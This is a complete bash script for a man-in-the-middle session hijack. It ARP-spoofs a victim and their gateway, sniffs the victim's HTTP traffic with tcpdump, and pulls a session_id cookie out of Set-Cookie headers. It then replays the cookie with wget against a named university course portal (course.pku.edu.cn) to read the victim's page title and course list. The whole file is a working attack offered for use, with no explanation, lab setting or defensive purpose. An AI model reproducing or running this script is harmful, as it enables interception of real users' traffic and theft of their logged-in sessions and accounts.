#! /bin/bash

if [ $# -ne 3 ]; then
	exit 1;
fi

fifo=`mktemp --suffix=.fifo -u -p ./`;
mkfifo $fifo;
arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
tcpdump -Xvv -i $1 -s 512 -U -w $fifo "tcp port 80 and host $2" 2>/dev/null &

exec 0< $fifo;
while read line; do
	cookie=`echo $line | grep -a -oP "(?<=Set-Cookie: session_id=)[0-9a-zA-Z]+"`
	if [ -n "$cookie" ]; then
		break;
	fi
done

jobs -pr | xargs -I {} kill -q -9 {};
rm $fifo;

if [ -z $cookie ]; then
	exit 1;
fi

url='http://course.pku.edu.cn/webapps/portal/execute/tabs/tabAction?tab_tab_group_id=_3_1';
wget --header "Cookie: session_id=$cookie" -O - -q -c $url | grep -oP "(?<=<title>)[^<]+";

url='http://course.pku.edu.cn/webapps/portal/execute/tabs/tabAction?action=refreshAjaxModule&modId=_4_1&tabId=_1_1&tab_tab_group_id=_3_1';
wget --header "Cookie: session_id=$cookie" -O - -q -c $url | grep -P "<a href=\"\s*/webapps/portal/frameset\.jsp\?tab_tab_group_id[^>]+>[^<]+</a>" | sed -e "s/<[^>]*>/\n/g" | sed -e "/^$/d";
